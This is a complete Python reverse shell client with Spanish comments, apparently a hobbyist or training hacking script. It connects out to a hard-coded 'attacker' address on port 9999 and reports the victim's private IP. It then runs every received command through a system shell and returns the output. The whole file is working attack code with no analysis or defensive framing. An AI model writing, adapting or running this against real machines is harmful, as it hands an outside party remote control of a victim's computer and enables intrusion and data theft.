import socket
import subprocess
import os

# Cambia esto a la IP del atacante
laptop_ip = '192.168.0.18'
laptop_port = 9999

# Crea un socket y se conecta a la laptop
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((laptop_ip, laptop_port))

# Envía la IP de la PC al servidor
private_ip = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if ip.startswith('192.') or ip.startswith('10.') or ip.startswith('172.')]
client_socket.sendall(private_ip[0].encode())

def ejecucion(client_socket):
    while True:
        comando = client_socket.recv(1024).decode().strip()

        if comando.lower() == 'exit':  # Salir si el comando es 'exit'
            break

        if comando.startswith("cd "):
            nuevo_directorio = comando[3:]
            try:
                os.chdir(nuevo_directorio)
                print(f"Cambiando directorio: {os.getcwd()}")
            except FileNotFoundError:
                print("Error: el directorio no existe")
        else:
            # Ejecutar el comando y capturar la salida
            output = subprocess.run(comando, shell=True, capture_output=True, text=True)
            # Enviar la salida completa al servidor
            client_socket.sendall(output.stdout.encode())
            client_socket.sendall(b'\n')  # Enviar una línea vacía para indicar el final de la salida

# Ejecuta la función de ejecución
ejecucion(client_socket)

client_socket.close()
